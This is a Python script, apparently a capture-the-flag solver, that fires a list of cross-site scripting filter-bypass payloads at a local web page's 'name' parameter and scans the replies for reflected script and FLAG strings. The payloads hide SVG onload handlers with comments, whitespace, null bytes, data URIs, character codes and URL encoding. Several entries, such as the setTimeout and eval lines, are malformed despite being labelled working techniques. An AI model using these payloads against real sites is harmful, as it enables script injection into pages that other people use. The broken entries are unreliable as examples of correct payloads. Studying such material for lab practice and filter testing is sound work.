import requests
import urllib.parse
import re
import base64

base_url = "http://127.0.0.1:33203/page"

# Simplified payload list focusing on working techniques
encoding_chain_payloads = [
    # Using HTML comments to break up tags
    ("HTML comment break", "<svg<!-- --> onload=alert('XSS')>", "html_comment_break"),
    
    # Newline obfuscation
    ("Newline obfuscation", "<svg\nonload=alert('XSS')>", "newline_obf"),
    
    # Tab obfuscation
    ("Tab obfuscation", "<svg\\tonload=alert('XSS')>", "tab_obf"),
    
    # Using &#x00 (null byte)
    ("Null byte", "<svg onload=alert('XSS')\x00>", "null_byte"),
    
    # Multiple spaces
    ("Multiple spaces", "<svg onload=     alert('XSS')>", "multi_space"),
    
    # SVG with script
    ("SVG script", "<svg><script>alert('XSS')</script>", "svg_script"),
    
    # Using data URI with base64
    ('Data URI base64', '<iframe src="data:text/html;base64,' + base64.b64encode(b'<script>alert("XSS")</script>').decode() + '">', "data_uri_b64"),
    
    # SetTimeout
    ("SetTimeout", '<svg onload=setTimeout("alert(",1000)>XSS")>', "settimeout"),
    
    # Using eval + unescape
    ("Eval unescape", '<svg onload=eval("alert(",27,"XSS",27,")")>', "eval_unescape"),
    
    # Using innerHTML
    ("InnerHTML", '<svg onload=innerHTML=String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,39,88,83,83,39,41,60,47,115,99,114,105,112,116,62)>', "innerhtml"),
    
    # Encoded SVG
    ("Encoded SVG", '%3Csvg%20onload%3Dalert(%27XSS%27)%3E', "encoded_svg"),
    
    # Double encoded
    ("Double encoded", '%253Csvg%2520onload%253Dalert%2528%2527XSS%2527%2529%253E', "double_encoded"),
]

print("[*] Testing Advanced XSS Encoding Chains - Simplified")

all_results = []

for test_name, payload, test_id in encoding_chain_payloads:
    print(f"\n[+] Testing: {test_name}")
    print(f"    [PAYLOAD] {payload[:60]}")
    
    try:
        params = {'name': payload}
        response = requests.get(base_url, params=params, timeout=10)
        
        payload_reflected = payload in response.text
        response_length = len(response.content)
        
        # Check for various indicators
        indicators = []
        if 'alert' in response.text.lower():
            indicators.append('alert')
        if 'XSS' in response.text:
            indicators.append('XSS')
        
        # Check for FLAG patterns
        flag_patterns = re.findall(r'FLAG\{[^}]+\}', response.text)
        
        print(f"    [STATUS]  {response.status_code}")
        print(f"    [LENGTH]  {response_length} bytes")
        print(f"    [REFLECT] Payload reflected: {payload_reflected}")
        
        if indicators:
            print(f"    [FOUND]   Indicators: {', '.join(indicators)}")
        
        if flag_patterns:
            print(f"    [!!]      FLAG FOUND: {flag_patterns}")
        
        # Check which message appears
        if 'error_star.png' in response.text:
            print(f"    [STAR]    Error star - Payload reached but failed")
            result_status = "ERROR_STAR"
        elif 'new_star.png' in response.text:
            print(f"    [STAR]    New star - Filtered")
            result_status = "FILTERED"
        else:
            result_status = "UNKNOWN"
        
        # Check for success indicators
        if 'Success' in response.text or 'Congratulations' in response.text:
            print(f"    [!!]      Success message found!")
            result_status = "SUCCESS"
        
        all_results.append({
            'test_name': test_name,
            'payload': payload,
            'status': response.status_code,
            'length': response_length,
            'reflected': payload_reflected,
            'indicators': indicators,
            'flags': flag_patterns,
            'result_status': result_status,
            'response_text': response.text
        })
        
    except Exception as e:
        print(f"    [ERROR]   {str(e)}")
        all_results.append({
            'test_name': test_name,
            'error': str(e)
        })

# Summary
print("\n[*] Testing Summary:")
print("-" * 80)
for result in all_results:
    if 'error' in result:
        print(f"[ERROR] {result['test_name']}")
    else:
        status_str = f"{result['result_status']:12}"
        print(f"[{status_str}] {result['test_name']:30} | {result['length']:4d}B | indicators: {len(result['indicators'])}")
        if result['flags']:
            print(f"  [!] FLAG: {result['flags']}")
            print(f"  [RESPONSE]: {result['response_text']}")

# Detailed review if any indicators found
print("\n[*] Detailed Analysis of Responses with Indicators:")
for result in all_results:
    if result.get('indicators') and not result.get('error'):
        print(f"\n[+] {result['test_name']}:")
        print(f"    Indicators: {result['indicators']}")
        print(f"    Response snippet: {result['response_text'][:200]}")

print("\n[*] Testing complete")
